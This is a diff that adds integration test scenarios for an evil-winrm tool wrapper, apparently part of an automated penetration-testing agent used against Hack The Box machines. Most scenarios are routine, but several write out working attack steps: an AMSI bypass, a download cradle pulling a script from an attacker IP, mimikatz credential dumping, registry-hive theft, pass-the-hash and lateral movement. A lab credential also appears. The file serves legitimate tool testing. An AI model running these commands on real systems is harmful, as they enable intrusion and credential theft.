@@ -1,0 +1,596 @@
+# Integration Scenarios: evil-winrm
+# Required HTB Machines: Any Windows box with WinRM (5985) open
+#   Recommended: Pirate, Garfield, Fries, Eighteen, Eloquent, DarkZero, Overwatch
+# Prerequisites: Valid Windows credentials (username + password or NTLM hash),
+#                target reachable on VPN, WinRM port 5985 open
+# Run with: pytest tests/tools/test_evil_winrm.py --tool=evil-winrm \
+#           --target=<IP> --username=<USER> --password=<PASS> \
+#           -m integration -v
+#
+# Recommended HTB box: Certified (medium, AD, WinRM open, has CLM on some accounts,
+#   supports NTLM and Kerberos auth, multiple users with different privilege levels)
+#   Alternatives: Pirate (insane, gMSA + Kerberos-only paths, NTLM disabled segments),
+#                 Hercules (insane, NTLM disabled — Kerberos mandatory)
+#
+# 3 methods: exec, upload, download
+# 31.9% error rate in engagement data (1707 calls) — error scenarios are critical
+
+# =============================================================================
+# COMMAND EXECUTION — BASIC SCENARIOS
+# =============================================================================
+
+## Scenario 1: Basic whoami (PowerShell, default)
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "whoami"}
+Expected: success=true, output contains domain\username, shell=PowerShell
+Notes: Simplest test. If this fails, all other tests will fail.
+
+## Scenario 2: whoami /all (PowerShell)
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "whoami /all"}
+Expected: success=true, output contains USER INFORMATION, GROUP INFORMATION, PRIVILEGES INFORMATION
+Notes: Tests multiline output parsing. Large output. Key for privilege analysis.
+
+## Scenario 3: CMD shell execution
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "dir C:\\", shell: "cmd"}
+Expected: success=true, output contains directory listing, shell=CMD
+Notes: Tests CMD shell mode (WinRS URI). Some commands only work in CMD.
+  Critical fallback when PowerShell Constrained Language Mode blocks operations.
+
+## Scenario 4: CMD specific commands
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "type C:\\Users\\<USER>\\Desktop\\user.txt", shell: "cmd"}
+Expected: success=true, output contains flag content
+Notes: 'type' is CMD-only (no PS equivalent besides Get-Content). Tests that CMD mode
+  actually uses CMD, not PowerShell.
+
+## Scenario 5: PowerShell cmdlets
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-Process | Select-Object -First 5 | Format-Table Name,Id"}
+Expected: success=true, output contains process table
+Notes: Tests PowerShell pipeline and Format-Table.
+
+## Scenario 6: PowerShell AD enumeration
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-ADUser -Filter * -Properties MemberOf | Select-Object -First 10 SamAccountName,MemberOf"}
+Expected: success=true (if AD module available), or error (if not a DC)
+Notes: Tests AD module. Only works on DCs or machines with RSAT.
+
+## Scenario 7: PowerShell with domain prefix
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, domain: <DOMAIN>, command: "whoami"}
+Expected: success=true, output shows DOMAIN\username
+Notes: Tests domain prefix in NTLM auth (DOMAIN\username format).
+
+## Scenario 8: PowerShell script block
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "$env:COMPUTERNAME; $env:USERDOMAIN; [System.Net.Dns]::GetHostName()"}
+Expected: success=true, output shows computer name and domain
+Notes: Tests multi-statement PS execution.
+
+## Scenario 9: Large output handling
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-ChildItem C:\\ -Recurse -Depth 3 -ErrorAction SilentlyContinue | Select-Object FullName"}
+Expected: success=true, large output (may be truncated in structuredContent summary)
+Notes: Tests output handling for large results. Check raw_output field.
+
+## Scenario 10: Command with special characters
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Write-Output 'Hello \"World\"'; Write-Output \"Pipe | test & ampersand\""}
+Expected: success=true, output contains both strings
+Notes: Tests quoting and special character handling in PS commands.
+
+# =============================================================================
+# COMMAND EXECUTION — ADVANCED POWERSHELL
+# =============================================================================
+
+## Scenario 11: PowerShell .NET method invocation
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "[System.IO.File]::ReadAllText('C:\\Users\\<USER>\\Desktop\\user.txt')"}
+Expected: success=true if not in CLM, isError if CLM blocks .NET
+Notes: .NET methods are blocked by Constrained Language Mode. If this fails with
+  CLM error, use shell='cmd' for file reading.
+
+## Scenario 12: PowerShell download cradle
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "IWR -Uri http://<ATTACKER_IP>:8080/script.ps1 -OutFile C:\\Windows\\Temp\\s.ps1"}
+Expected: success=true if outbound HTTP is allowed
+Notes: Tests file download from attacker server. May fail if firewall blocks outbound.
+  Alternative: upload method is more reliable than download cradles.
+
+## Scenario 13: PowerShell AMSI bypass + execution
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $b=$a.GetField('amsiInitFailed','NonPublic,Static'); $b.SetValue($null,$true); IEX(Get-Content C:\\Windows\\Temp\\script.ps1 -Raw)"}
+Expected: success varies — AMSI bypass may work or be patched
+Notes: Tests AMSI bypass technique. Newer Windows patches block reflection-based bypass.
+  If blocked, use obfuscated versions or alternative bypass techniques.
+
+## Scenario 14: PowerShell registry enumeration
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\* -ErrorAction SilentlyContinue"}
+Expected: success=true with WinRM policy settings
+Notes: Enumerate WinRM configuration via registry. Useful for understanding CLM/JEA settings.
+
+## Scenario 15: PowerShell network enumeration
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-NetIPAddress | Format-Table InterfaceAlias,IPAddress,PrefixLength -AutoSize; Get-NetRoute | Where-Object {$_.DestinationPrefix -ne '0.0.0.0/0'} | Format-Table DestinationPrefix,NextHop -AutoSize"}
+Expected: success=true with network interfaces and routing table
+Notes: Critical for understanding internal network topology during lateral movement.
+
+## Scenario 16: PowerShell firewall enumeration
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-NetFirewallProfile | Format-Table Name,Enabled; Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'} | Select-Object -First 20 DisplayName,Action"}
+Expected: success=true with firewall profiles and rules
+Notes: Understanding firewall rules is essential for planning lateral movement and exfil.
+
+# =============================================================================
+# FILE UPLOAD SCENARIOS
+# =============================================================================
+
+## Scenario 17: Upload small text file
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/test.txt", remote_path: "C:\\Windows\\Temp\\test.txt"}
+Expected: success=true, data contains size > 0
+Notes: Create test.txt in /session/artifacts/ first. Upload uses PSRP native copy.
+
+## Scenario 18: Upload binary (executable)
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/winPEASx64.exe", remote_path: "C:\\Windows\\Temp\\winPEAS.exe"}
+Expected: success=true, data contains size matching source file
+Notes: Tests binary file transfer. Verify with: exec "Get-FileHash C:\Windows\Temp\winPEAS.exe"
+
+## Scenario 19: Upload to user directory
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/Rubeus.exe", remote_path: "C:\\Users\\<USER>\\Desktop\\Rubeus.exe"}
+Expected: success=true
+Notes: Tests upload to user-writable directory.
+
+## Scenario 20: Upload to restricted directory
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/test.txt", remote_path: "C:\\Windows\\System32\\test.txt"}
+Expected: error (permission denied) if user is not admin, success if admin
+Notes: Tests error handling for permission denied on upload.
+
+## Scenario 21: Upload with domain auth
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, domain: <DOMAIN>, local_path: "/session/artifacts/test.txt", remote_path: "C:\\Windows\\Temp\\test.txt"}
+Expected: success=true
+Notes: Tests domain prefix works with upload method.
+
+## Scenario 22: Upload non-existent local file
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/DOES_NOT_EXIST.exe", remote_path: "C:\\Windows\\Temp\\test.exe"}
+Expected: isError=true, error_class=params, retryable=false
+Notes: Tests the pre-flight local file existence check. Should fail fast without
+  attempting connection.
+
+## Scenario 23: Upload large file (>5MB)
+Method: upload
+Args: {target: <IP>, username: <USER>, password: <PASS>, local_path: "/session/artifacts/SharpHound.exe", remote_path: "C:\\Windows\\Temp\\sh.exe"}
+Expected: success=true, may take 30+ seconds
+Notes: PSRP file transfer can be slow for large files (~1MB/s). For very large files,
+  consider SMB put_file via netexec instead.
+
+# =============================================================================
+# FILE DOWNLOAD SCENARIOS
+# =============================================================================
+
+## Scenario 24: Download flag file
+Method: download
+Args: {target: <IP>, username: <USER>, password: <PASS>, remote_path: "C:\\Users\\<USER>\\Desktop\\user.txt"}
+Expected: success=true, local_path=/session/artifacts/user.txt, size > 0
+Notes: Default local_path is /session/artifacts/<filename>. Classic CTF flag download.
+
+## Scenario 25: Download with explicit local_path
+Method: download
+Args: {target: <IP>, username: <USER>, password: <PASS>, remote_path: "C:\\Users\\<USER>\\Desktop\\user.txt", local_path: "/session/artifacts/flags/user.txt"}
+Expected: success=true, creates parent directories as needed
+Notes: Tests custom local_path with nested directory creation.
+
+## Scenario 26: Download SAM hive (admin required)
+Method: download
+Args: {target: <IP>, username: <ADMIN_USER>, password: <ADMIN_PASS>, remote_path: "C:\\Windows\\System32\\config\\SAM"}
+Expected: error (file locked) or success if shadow copy is used
+Notes: SAM is locked by OS. Usually need: exec "reg save HKLM\SAM C:\Temp\sam" first.
+
+## Scenario 27: Download nonexistent file
+Method: download
+Args: {target: <IP>, username: <USER>, password: <PASS>, remote_path: "C:\\nonexistent_file_12345.txt"}
+Expected: isError=true, classified error
+Notes: Tests error handling for missing remote file.
+
+## Scenario 28: Download large file
+Method: download
+Args: {target: <IP>, username: <USER>, password: <PASS>, remote_path: "C:\\Windows\\System32\\ntoskrnl.exe"}
+Expected: success=true (if readable), size > 5MB
+Notes: Tests large file transfer over PSRP. May take 30+ seconds.
+
+## Scenario 29: Download with SSL (port 5986)
+Method: download
+Args: {target: <IP>, username: <USER>, password: <PASS>, ssl: true, remote_path: "C:\\Users\\<USER>\\Desktop\\user.txt"}
+Expected: success=true if HTTPS WinRM (5986) is available, network error if not
+Notes: Tests SSL code path. Many HTB boxes only have HTTP WinRM (5985).
+
+# =============================================================================
+# PASS-THE-HASH SCENARIOS
+# =============================================================================
+
+## Scenario 30: PTH with bare NT hash
+Method: exec
+Args: {target: <IP>, username: "administrator", hash: "<NT_HASH>", command: "whoami"}
+Expected: success=true, output shows admin account
+Notes: Hash format: 32 hex chars (bare NT hash). Auto-prefixed with 32 zero bytes
+  by the server code (00000000000000000000000000000000:<NT_HASH>).
+
+## Scenario 31: PTH with LM:NT hash
+Method: exec
+Args: {target: <IP>, username: "administrator", hash: "aad3b435b51404ee:<NT_HASH>", command: "whoami"}
+Expected: success=true, same as bare hash
+Notes: Full LM:NT format. aad3b435b51404ee is standard empty LM hash.
+
+## Scenario 32: PTH upload
+Method: upload
+Args: {target: <IP>, username: "administrator", hash: "<NT_HASH>", local_path: "/session/artifacts/mimikatz.exe", remote_path: "C:\\Windows\\Temp\\m.exe"}
+Expected: success=true
+Notes: Tests pass-the-hash with file upload. All three methods (exec, upload, download)
+  support PTH through the shared _get_client auth logic.
+
+## Scenario 33: PTH download
+Method: download
+Args: {target: <IP>, username: "administrator", hash: "<NT_HASH>", remote_path: "C:\\Users\\Administrator\\Desktop\\root.txt"}
+Expected: success=true, flag content downloaded
+Notes: Tests PTH with download. Common pattern: dump hash from one box, PTH to another.
+
+## Scenario 34: PTH with wrong hash
+Method: exec
+Args: {target: <IP>, username: "administrator", hash: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", command: "whoami"}
+Expected: isError=true, error_class=auth, retryable=false
+Notes: Tests auth failure classification with PTH. Should not be retried.
+
+## Scenario 35: PTH with machine account (gMSA)
+Method: exec
+Args: {target: <IP>, username: "gMSA_ADCS_prod$", hash: "<GMSA_NT_HASH>", domain: "pirate.htb", command: "whoami"}
+Expected: success=true, output shows pirate\gmsa_adcs_prod$
+Notes: gMSA accounts use machine account format (trailing $). From engagement data:
+  481 calls with this pattern on Pirate. Domain prefix is critical for machine accounts.
+HTB Machines: Pirate (gMSA_ADCS_prod$)
+
+## Scenario 36: PTH with domain prefix
+Method: exec
+Args: {target: <IP>, username: "administrator", hash: "<NT_HASH>", domain: <DOMAIN>, command: "whoami"}
+Expected: success=true, output shows DOMAIN\administrator
+Notes: Tests that domain prefix is correctly prepended for NTLM auth with hash.
+
+# =============================================================================
+# KERBEROS AUTHENTICATION SCENARIOS
+# =============================================================================
+
+## Scenario 37: Kerberos auth with ccache
+Method: exec
+Args: {target: <IP>, username: "user@REALM", auth: "kerberos", ccache_path: "/session/credentials/user.ccache", command: "whoami"}
+Expected: success=true (if ccache valid)
+Notes: Requires impacket get_tgt first. ccache must be at specified path.
+  Username MUST be in user@REALM format for Kerberos (not DOMAIN\user).
+  Server sets KRB5CCNAME env var and copies krb5.conf from /session/config/.
+
+## Scenario 38: Kerberos with expired ticket
+Method: exec
+Args: {target: <IP>, username: "user@REALM", auth: "kerberos", ccache_path: "/session/credentials/expired.ccache", command: "whoami"}
+Expected: isError=true, error_class=auth
+Notes: Tests Kerberos ticket expiry handling. Default ticket lifetime is 10 hours.
+
+## Scenario 39: Kerberos with clock skew
+Method: exec
+Args: {target: <IP>, username: "user@REALM", auth: "kerberos", ccache_path: "/session/credentials/user.ccache", command: "whoami"}
+Expected: isError=true, error_class=config, suggestions mention clock
+Notes: If container clock is >5 minutes off from DC, triggers KRB_AP_ERR_SKEW.
+  Fix: use impacket get_tgt with clock_offset to get a time-adjusted TGT.
+
+## Scenario 40: Kerberos auth when NTLM is disabled
+Method: exec
+Args: {target: <NTLM_DISABLED_HOST>, username: "auditor@HERCULES.HTB", auth: "kerberos", ccache_path: "/session/credentials/auditor.ccache", command: "whoami"}
+Expected: success=true (Kerberos bypass when NTLM blocked)
+Notes: From engagement data: Hercules had near 100% failure rate (17/18) with NTLM.
+  The only successful path was Kerberos auth. Agent must detect NTLM failure
+  error message ("Failed to authenticate...with ntlm") and switch to auth='kerberos'.
+HTB Machines: Hercules (insane, NTLM disabled)
+
+## Scenario 41: NTLM failure on Kerberos-only host (detection scenario)
+Method: exec
+Args: {target: <NTLM_DISABLED_HOST>, username: "auditor", password: "<PASS>", domain: "hercules.htb", command: "whoami"}
+Expected: isError=true, error_class=auth, suggestions include "try auth='kerberos'"
+Notes: Deliberately use default NTLM auth against a Kerberos-only host.
+  The error classification should suggest switching to Kerberos.
+  This is the MOST COMMON evil-winrm failure pattern in engagement data.
+HTB Machines: Hercules
+
+## Scenario 42: Kerberos upload
+Method: upload
+Args: {target: <IP>, username: "user@REALM", auth: "kerberos", ccache_path: "/session/credentials/user.ccache", local_path: "/session/artifacts/tool.exe", remote_path: "C:\\Windows\\Temp\\tool.exe"}
+Expected: success=true if ccache is valid
+Notes: Tests Kerberos auth with file upload. All methods share the same auth path.
+
+## Scenario 43: Kerberos download
+Method: download
+Args: {target: <IP>, username: "user@REALM", auth: "kerberos", ccache_path: "/session/credentials/user.ccache", remote_path: "C:\\Users\\<USER>\\Desktop\\user.txt"}
+Expected: success=true if ccache is valid
+Notes: Tests Kerberos auth with file download.
+
+# =============================================================================
+# SSL / CUSTOM PORT SCENARIOS
+# =============================================================================
+
+## Scenario 44: WinRM over SSL (port 5986)
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, ssl: true, command: "whoami"}
+Expected: success=true if HTTPS WinRM is available
+Notes: Some environments only expose WinRM over HTTPS (5986). cert_validation=False
+  is set by default — self-signed certs are accepted.
+
+## Scenario 45: WinRM on custom port
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, port: 47001, command: "whoami"}
+Expected: success=true if WinRM is on non-standard port, network error otherwise
+Notes: WinRM may be on 47001 (Windows Remote Management compatibility listener)
+  or other custom ports in enterprise environments.
+
+# =============================================================================
+# CONSTRAINED LANGUAGE MODE (CLM) SCENARIOS
+# =============================================================================
+
+## Scenario 46: Detect CLM via .NET method invocation
+Method: exec
+Args: {target: <CLM_TARGET>, username: <USER>, password: <PASS>, command: "[System.IO.File]::ReadAllText('C:\\flag.txt')"}
+Expected: isError=true, error_class=permission, suggestions mention shell='cmd'
+Notes: CLM blocks .NET method invocation. Only testable on hosts with CLM policy.
+  The error classifier catches "ConstrainedLanguage" in stderr.
+
+## Scenario 47: Verify CLM is active
+Method: exec
+Args: {target: <CLM_TARGET>, username: <USER>, password: <PASS>, command: "$ExecutionContext.SessionState.LanguageMode"}
+Expected: success=true, output contains "ConstrainedLanguage"
+Notes: This command itself works in CLM — it just reads a property. Output confirms
+  CLM is active. Use this to detect before attempting .NET methods.
+
+## Scenario 48: CMD fallback for CLM bypass
+Method: exec
+Args: {target: <CLM_TARGET>, username: <USER>, password: <PASS>, command: "type C:\\Users\\<USER>\\Desktop\\user.txt", shell: "cmd"}
+Expected: success=true with file content
+Notes: CMD shell bypasses CLM entirely. Use shell='cmd' for basic operations
+  when CLM blocks PowerShell. Critical agent knowledge: CLM detected → switch to CMD.
+
+## Scenario 49: Limited PowerShell in CLM
+Method: exec
+Args: {target: <CLM_TARGET>, username: <USER>, password: <PASS>, command: "Get-ChildItem C:\\Users\\<USER>\\Desktop\\"}
+Expected: success=true — basic cmdlets work in CLM
+Notes: Simple cmdlets without .NET or Add-Type work in CLM. Only complex operations
+  (reflection, COM objects, script blocks with variables) are blocked.
+
+## Scenario 50: CLM with AppLocker (double restriction)
+Method: exec
+Args: {target: <CLM_TARGET>, username: <USER>, password: <PASS>, command: "C:\\Windows\\Temp\\Rubeus.exe"}
+Expected: isError=true, error mentions program blocked by policy
+Notes: AppLocker + CLM is a common hardened configuration. Executables only run from
+  allowed paths (C:\Windows\, Program Files). Use MSBuild/InstallUtil bypass or
+  LOLBAS techniques.
+
+# =============================================================================
+# SESSION LIFECYCLE SCENARIOS (multi-step workflows)
+# =============================================================================
+
+## Scenario 51: Full exploitation workflow
+Steps:
+  1. exec: whoami (verify access)
+  2. exec: ipconfig /all (network info)
+  3. upload: /session/artifacts/winPEAS.exe -> C:\Windows\Temp\wp.exe
+  4. exec: C:\Windows\Temp\wp.exe (run enumeration)
+  5. download: C:\Users\<USER>\Desktop\user.txt (get flag)
+Expected: All steps succeed, no state issues between calls
+Notes: Tests that multiple sequential calls work correctly. Each call creates
+  a new PSRP connection (no session reuse between MCP calls).
+
+## Scenario 52: Post-exploitation enumeration chain
+Steps:
+  1. exec: net user (local users)
+  2. exec: net localgroup administrators (admin group members)
+  3. exec: netstat -an (network connections)
+  4. exec: Get-Service | Where-Object {$_.Status -eq 'Running'} (running services)
+  5. exec: Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} (scheduled tasks)
+  6. exec: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname" (installed software)
+Expected: All succeed, good enumeration data
+Notes: Common post-exploitation enumeration commands.
+
+## Scenario 53: Upload and execute workflow
+Steps:
+  1. upload: /session/artifacts/SharpHound.exe -> C:\Windows\Temp\sh.exe
+  2. exec: C:\Windows\Temp\sh.exe -c All --zipfilename bloodhound.zip
+  3. exec: Get-ChildItem C:\Windows\Temp\*bloodhound*.zip (find output)
+  4. download: C:\Windows\Temp\<timestamp>_bloodhound.zip
+Expected: Upload succeeds, execution produces output, download gets results
+Notes: Classic BloodHound collection workflow.
+
+## Scenario 54: Credential extraction workflow
+Steps:
+  1. exec: whoami /priv (check SeDebugPrivilege)
+  2. upload: /session/artifacts/mimikatz.exe -> C:\Windows\Temp\m.exe
+  3. exec: C:\Windows\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+  4. Parse output for NTLM hashes and plaintext passwords
+Expected: Requires admin + SeDebugPrivilege for logonpasswords
+Notes: Classic mimikatz credential dump. Alternative: procdump LSASS then offline extraction.
+
+## Scenario 55: SAM dump via reg save + download
+Steps:
+  1. exec (cmd): reg save HKLM\SAM C:\Windows\Temp\sam
+  2. exec (cmd): reg save HKLM\SYSTEM C:\Windows\Temp\system
+  3. exec (cmd): reg save HKLM\SECURITY C:\Windows\Temp\security
+  4. download: C:\Windows\Temp\sam -> /session/artifacts/sam
+  5. download: C:\Windows\Temp\system -> /session/artifacts/system
+  6. download: C:\Windows\Temp\security -> /session/artifacts/security
+  7. exec (cmd): del C:\Windows\Temp\sam C:\Windows\Temp\system C:\Windows\Temp\security
+Expected: All succeed, three hive files downloaded for offline extraction
+Notes: Alternative to in-memory SAM dump. Files can be processed with
+  impacket secretsdump -sam sam -system system -security security LOCAL
+
+## Scenario 56: Lateral movement via PS remoting (double-hop)
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Invoke-Command -ComputerName <INTERNAL_HOST> -ScriptBlock { whoami }"}
+Expected: isError=true (double-hop / logon session failure)
+Notes: From engagement data (Pirate): 11 failures with "logon session does not exist".
+  This is the Kerberos double-hop problem — WinRM session can't delegate to a third host.
+  Fix: Use CredSSP, resource-based constrained delegation, or get a TGT on the target.
+HTB Machines: Pirate
+
+## Scenario 57: Lateral movement via PS remoting with credential delegation
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "$secpw = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>', $secpw); Invoke-Command -ComputerName <INTERNAL_HOST> -Credential $cred -ScriptBlock { whoami }"}
+Expected: May succeed if CredSSP/delegation is configured, otherwise double-hop failure
+Notes: Explicitly passing credentials can sometimes work around double-hop.
+  More reliable: use impacket directly against the internal host.
+
+# =============================================================================
+# ERROR HANDLING SCENARIOS
+# =============================================================================
+
+## Scenario 58: Wrong credentials
+Method: exec
+Args: {target: <IP>, username: "nonexistent_user_xyz", password: "wrong_pass_abc", command: "whoami"}
+Expected: isError=true, error_class=auth, retryable=false
+Notes: Should classify as auth failure, not crash. "Failed to authenticate" in error.
+
+## Scenario 59: Filtered port (no WinRM)
+Method: exec
+Args: {target: <NON_WINRM_IP>, username: "test", password: "test", command: "whoami"}
+Expected: isError=true, error_class=network or timeout, retryable=true
+Notes: Use a target without WinRM to test connection timeout handling.
+
+## Scenario 60: Elevation required
+Method: exec
+Args: {target: <IP>, username: <LOW_PRIV_USER>, password: <PASS>, command: "net session"}
+Expected: isError=true (exit_code != 0), stderr mentions "elevated"
+Notes: net session requires admin. Tests PS command-level error handling.
+  error_class should be "permission" with suggestion about admin privileges.
+
+## Scenario 61: Large command output truncation
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue"}
+Expected: success=true (large output), verify output is not corrupted
+Notes: Tests that very large outputs don't break the PSRP or MCP transport.
+
+## Scenario 62: WSManFault Code:5 (Access Denied)
+Method: exec
+Args: {target: <IP>, username: <NON_RMU_USER>, password: <PASS>, domain: <DOMAIN>, command: "whoami"}
+Expected: isError=true, error_class=permission
+Notes: From engagement data (Overwatch): 44 occurrences of WSManFault Code:5.
+  User is valid but not in Remote Management Users group. The error classifier
+  should return permission error with suggestion to use a different account.
+HTB Machines: Overwatch (sqlmgmt user)
+
+## Scenario 63: Service Unavailable (HTTP 503)
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "whoami"}
+Expected: isError=true, error_class=network, retryable=true
+Notes: WinRM service returning 503. May happen during service restart or overload.
+  Retryable after brief wait.
+
+## Scenario 64: Connection refused
+Method: exec
+Args: {target: <IP_WITH_CLOSED_5985>, username: "test", password: "test", command: "whoami"}
+Expected: isError=true, error_class=network, retryable=true
+Notes: Connection refused — WinRM not running. Check port 5985/5986.
+
+## Scenario 65: No route to host
+Method: exec
+Args: {target: "192.168.255.254", username: "test", password: "test", command: "whoami"}
+Expected: isError=true, error_class=network, retryable=false
+Notes: Unreachable host. Check VPN connection. Non-retryable (routing issue, not transient).
+
+## Scenario 66: Command execution timeout
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Start-Sleep -Seconds 120"}
+Expected: isError=true, error_class=timeout, retryable=true
+Notes: Command runs longer than pypsrp connection_timeout (30s). Should timeout cleanly.
+
+## Scenario 67: Account locked out
+Method: exec
+Args: {target: <IP>, username: <LOCKED_USER>, password: <PASS>, domain: <DOMAIN>, command: "whoami"}
+Expected: isError=true, error_class=auth, retryable=false
+Notes: STATUS_LOGON_FAILURE for locked accounts. Should not retry (extends lockout).
+
+# =============================================================================
+# HTB-SPECIFIC SCENARIOS (from engagement data)
+# =============================================================================
+
+## Scenario 68: Pirate - gMSA pass-the-hash
+Machine: Pirate (Insane)
+Method: exec
+Args: {target: <PIRATE_IP>, username: "gMSA_ADCS_prod$", hash: "<GMSA_HASH>", domain: "pirate.htb", command: "whoami"}
+Expected: success=true, output shows pirate\gmsa_adcs_prod$
+Notes: gMSA accounts use machine account format (trailing $). 481 calls in engagement.
+
+## Scenario 69: Pirate - multi-hop PS remoting failure
+Machine: Pirate (Insane)
+Method: exec
+Args: {target: <PIRATE_IP>, username: "gMSA_ADCS_prod$", hash: "<GMSA_HASH>", domain: "pirate.htb", command: "Invoke-Command -ComputerName WEB01 -ScriptBlock { whoami }"}
+Expected: isError=true (logon session failure or double-hop issue)
+Notes: 11 failures with "logon session does not exist" from double-hop Kerberos.
+
+## Scenario 70: Overwatch - access denied privilege escalation
+Machine: Overwatch (Hard)
+Method: exec
+Args: {target: <OVERWATCH_IP>, username: "sqlmgmt", password: "<PASS>", command: "net localgroup administrators"}
+Expected: May succeed or fail depending on sqlmgmt's privileges
+Notes: WSManFault Code:5 was the primary error in Overwatch (44 occurrences).
+
+## Scenario 71: Hercules - NTLM disabled, Kerberos only
+Machine: Hercules (Insane)
+Method: exec
+Args: {target: <HERCULES_IP>, username: "auditor", password: "<PASS>", domain: "hercules.htb", command: "whoami"}
+Expected: isError=true, error_class=auth ("Failed to authenticate...with ntlm")
+Notes: Near 100% failure rate (17/18). NTLM disabled. Must use auth='kerberos'.
+Follow-up: Same call with auth='kerberos' + ccache should succeed.
+
+## Scenario 72: Eighteen - domain user uploads
+Machine: Eighteen (Medium)
+Method: upload
+Args: {target: <EIGHTEEN_IP>, username: "adam.scott", password: "iloveyou1", domain: "eighteen.htb", local_path: "/session/artifacts/Rubeus.exe", remote_path: "C:\\Windows\\Temp\\Rubeus.exe"}
+Expected: success=true
+Notes: 9 internal errors in engagement (ToolResult missing 'data' -- now fixed).
+
+# =============================================================================
+# EDGE CASE SCENARIOS
+# =============================================================================
+
+## Scenario 73: Username with special characters
+Method: exec
+Args: {target: <IP>, username: "j.o'brien", password: <PASS>, domain: <DOMAIN>, command: "whoami"}
+Expected: success=true if creds are valid
+Notes: Tests apostrophe in username. pypsrp should handle this in NTLM auth.
+
+## Scenario 74: Empty command
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: ""}
+Expected: isError or empty output, should not crash
+Notes: Edge case — empty command string. Should be handled gracefully.
+
+## Scenario 75: Unicode output handling
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "Write-Output '日本語テスト'; Write-Output 'Ñoño'"}
+Expected: success=true, output contains Unicode characters
+Notes: Tests that non-ASCII output is handled correctly through PSRP + MCP transport.
+
+## Scenario 76: Concurrent operations (rapid sequential calls)
+Steps:
+  1. exec: whoami
+  2. exec: hostname (immediately after)
+  3. upload: small file (immediately after)
+  4. exec: dir C:\Windows\Temp (immediately after)
+Expected: All succeed independently
+Notes: Tests that rapid sequential MCP calls don't interfere. Each creates a new
+  pypsrp Client — there's no connection pooling or session reuse.
+
+## Scenario 77: Binary output handling
+Method: exec
+Args: {target: <IP>, username: <USER>, password: <PASS>, command: "[System.IO.File]::ReadAllBytes('C:\\Windows\\System32\\drivers\\etc\\hosts') | ForEach-Object { [Convert]::ToString($_, 16).PadLeft(2, '0') } | Select-Object -First 100"}
+Expected: success=true with hex output
+Notes: Tests handling of binary data converted to text. Verifies no encoding corruption.
